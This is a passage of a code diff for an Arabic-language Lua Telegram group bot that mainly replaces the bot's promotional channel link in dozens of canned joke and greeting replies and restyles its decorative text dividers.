 if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
 db = 'متحركه'
@@ -13280,7 +13285,7 @@ ght = math.random(2,22);
 local Text ='تم اختيار اغنيه بفديو  لك 🌚💘 ' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -13292,7 +13297,7 @@ ght = math.random(1,33);
 local Text ='الستخدم ثيم اخر اكتب ثيم لك 🌚💘'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
- {{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+ {{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
@@ -13411,7 +13416,7 @@ PRo = '❴ ✔️ ❵'
 else
 PRo = '❴ ✖ ❵'
 end 
-send(msg.chat_id_, msg.id_,'\n 🌕 صلاحيات البوت هي\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕  علامة ال {✔️} تعني مفعل\n 🌕  علامة ال {✖} تعني غير مفعل\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 تغير معلومات المجموعة ↞ '..INf..'\n 🌕 مسح الرسائل ↞ '..DEL..'\n 🌕 حظر المستخدمين ↞ '..REs..'\n 🌕 دعوة المستخدمين ↞ '..INv..'\n 🌕 ثتبيت الرسالة ↞ '..Pin..'\n 🌕 اضافة مشرفين ↞ '..PRo)   
+send(msg.chat_id_, msg.id_,'\n 🌕 صلاحيات البوت هي\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕  علامة ال {✔️} تعني مفعل\n 🌕  علامة ال {✖} تعني غير مفعل\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 تغير معلومات المجموعة ↞ '..INf..'\n 🌕 مسح الرسائل ↞ '..DEL..'\n 🌕 حظر المستخدمين ↞ '..REs..'\n 🌕 دعوة المستخدمين ↞ '..INv..'\n 🌕 ثتبيت الرسالة ↞ '..Pin..'\n 🌕 اضافة مشرفين ↞ '..PRo)   
 end
 end
 if text == "تعطيل الانستا" and Manager(msg) then
@@ -13452,7 +13457,7 @@ User_id = "@"..b.username_
 else
 User_id = msg.sender_user_id_
 end --الكود حصري سورس السيزريعني لو بكتهن راح اعرفك انت الاخذتهن
-local t = "\n 🌕 المستخدم ~ ["..User_id .."] يصيح المشرفين \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+local t = "\n 🌕 المستخدم ~ ["..User_id .."] يصيح المشرفين \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 k = 0
 for i,v in pairs(data.members_) do
 if bot_id ~= v.user_id_ then 
@@ -13498,7 +13503,7 @@ end
 return false
 end
 local list = database:smembers(bot_id.."botss:DRAGON:List:Rd:Sudo")
-text = "\nقائمة ردود المتعدده \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+text = "\nقائمة ردود المتعدده \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 db = "رساله "
 text = text..""..k.." => ↝ '..v..' ↜ => ↝ '..db..' ↜\n"
@@ -13868,7 +13873,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[انت مطوري نور عنيا🥺🤍](t.me/surccesezr)'
+local textt = '[انت مطوري نور عنيا🥺🤍](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -13896,7 +13901,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/surccesezr)'
+local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -13924,7 +13929,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[انت المطور بس الصغنن 🌝💘](t.me/surccesezr)'
+local textt = '[انت المطور بس الصغنن 🌝💘](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -13952,7 +13957,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/surccesezr)'
+local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -13980,7 +13985,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/surccesezr)'
+local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -14008,7 +14013,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/surccesezr)'
+local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -14036,7 +14041,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/surccesezr)'
+local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -14064,7 +14069,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/surccesezr)'
+local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -14092,7 +14097,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[ انت مميز ابن ناس 😊 ](t.me/surccesezr)'
+local textt = '[ انت مميز ابن ناس 😊 ](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -14120,7 +14125,7 @@ send(msg.chat_id_, msg.id_," 🌕 انا مين معطله")
 return false  
 end
 local msg_id = msg.id_/2097152/0.5  
-local textt = '[ عضو قميل 🌝💘 ](t.me/surccesezr)'
+local textt = '[ عضو قميل 🌝💘 ](t.me/A_F_fwdka1)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -14188,7 +14193,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_," ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14198,7 +14203,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_," 🌕 معطله") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14211,7 +14216,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14226,7 +14231,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14253,7 +14258,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚💘](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14266,7 +14271,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..😒♥️](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..😒♥️](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14292,7 +14297,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚💘](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14302,7 +14307,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..🌚♥️](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..🌚♥️](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14312,7 +14317,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب😑😂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب😑😂](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14322,7 +14327,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي😹👻](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي😹👻](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14332,7 +14337,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14342,7 +14347,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب..🙂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب..🙂](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14352,7 +14357,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14362,7 +14367,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي..🥺💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي..🥺💔](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14372,7 +14377,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[اوه ياه..🌝😂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[اوه ياه..🌝😂](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14382,7 +14387,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[امك اسمها احلام..😹😹](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[امك اسمها احلام..😹😹](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14392,7 +14397,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك 💘😂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك 💘😂](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14402,7 +14407,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝💘](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14412,7 +14417,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝💘](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14422,7 +14427,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[خلصتت روحكك يبعيد😹💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[خلصتت روحكك يبعيد😹💔](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14432,7 +14437,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[بتفكر في اي..🤔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[بتفكر في اي..🤔](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14442,7 +14447,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 💋🥰](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 💋🥰](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14452,7 +14457,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[محات حياتي يروحي..🌚💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[محات حياتي يروحي..🌚💔](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14462,7 +14467,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[القمر ده شبهك..🙂♥️](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[القمر ده شبهك..🙂♥️](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14472,7 +14477,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي..💛](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي..💛](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14482,7 +14487,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي..🐣😹](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي..🐣😹](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14492,7 +14497,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[دايما ياحبيبي..🌚💜](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[دايما ياحبيبي..🌚💜](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14502,7 +14507,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه الالسيزر](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه الالسيزر](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14515,7 +14520,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14530,7 +14535,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14542,7 +14547,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚💘](t.me/A_F_fwdka1)')
 return false
 end
 
@@ -14555,7 +14560,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14569,7 +14574,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ونجيب اشخاص..😂😜](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[ونجيب اشخاص..😂😜](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14584,7 +14589,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰💘](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14599,7 +14604,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14613,7 +14618,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وعليكم السلام..🌚🖤](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[وعليكم السلام..🌚🖤](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14627,7 +14632,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[خخخ امال..😹](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[خخخ امال..😹](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14641,7 +14646,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14655,7 +14660,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[عيب ياوسخ..🙄💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[عيب ياوسخ..🙄💔](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14669,7 +14674,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[نعم يا مطوري..🥺💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[نعم يا مطوري..🥺💔](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14683,7 +14688,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[مش هروح..😹👻](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[مش هروح..😹👻](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14697,7 +14702,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح..😹👻](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح..😹👻](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14711,7 +14716,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14725,7 +14730,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[صح النوم..😂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[صح النوم..😂](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14739,7 +14744,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[صباح العسل 🍯🙂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[صباح العسل 🍯🙂](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14753,7 +14758,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي..🙂💛](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي..🙂💛](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14767,7 +14772,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🥺💔](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🥺💔](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14781,7 +14786,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺💘](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14795,7 +14800,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚💘](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14809,7 +14814,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[عندو كام سنه..😹💥](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[عندو كام سنه..😹💥](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14823,7 +14828,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا..😂](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا..😂](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -14837,7 +14842,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💘](t.me/surccesezr)')
+send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💘](t.me/A_F_fwdka1)')
 return false
 end
 end
@@ -15324,12 +15329,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜  ↝• 🖤\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜  ↝• 🖤\n|• 𝒓𝒂𝒏𝒌→ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜  ↝• 🖤\n|• 𝒊𝒅 →   ↝'..msg.sender_user_id_..'↜ ↝• 🖤\n|• 𝒃𝒊𝒐 →  ↝'..getbioY..'↜ ↝• 🖤\n|• 𝒄𝒉 →  ↝https://t.me/surccesezr↜   ↝• 🖤\n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜  ↝• 🖤\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜  ↝• 🖤\n|• 𝒓𝒂𝒏𝒌→ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜  ↝• 🖤\n|• 𝒊𝒅 →   ↝'..msg.sender_user_id_..'↜ ↝• 🖤\n|• 𝒃𝒊𝒐 →  ↝'..getbioY..'↜ ↝• 🖤\n|• 𝒄𝒉 →  ↝@A_F_fwdka1↜   ↝• 🖤\n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n|✙ بيك عزيزي ↝'..Name..'↜ \n|• 𝒖𝒔𝒆𝒓 →  ↝'..Name..'↜    ↝• 🖤\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜.   ↝• 🖤\n|• 𝒓𝒂𝒏𝒌 → ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜    ↝• 🖤\n|• 𝒊𝒅  →  ↝'..msg.sender_user_id_..'↜    ↝• 🖤\n|• 𝒄𝒉 →   ↝https://t.me/surccesezr↜ • 🖤\n')
+send(msg.chat_id_, msg.id_,'[\n|✙ بيك عزيزي ↝'..Name..'↜ \n|• 𝒖𝒔𝒆𝒓 →  ↝'..Name..'↜    ↝• 🖤\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜.   ↝• 🖤\n|• 𝒓𝒂𝒏𝒌 → ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜    ↝• 🖤\n|• 𝒊𝒅  →  ↝'..msg.sender_user_id_..'↜    ↝• 🖤\n|• 𝒄𝒉 →   ↝@A_F_fwdka1↜ • 🖤\n')
 else
-send(msg.chat_id_, msg.id_, '\n 🌕 الصوره ⇜ ليس لديك صور في حسابك'..'[\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜\n|• 𝒎𝒔𝒈𝒔→ ↝'..Msguser..'↜\n|• 𝒊𝒅 →  ↝'..msg.sender_user_id_..'↜\n|• 𝒄𝒉→  ↝https://t.me/surccesezr ↜\n')
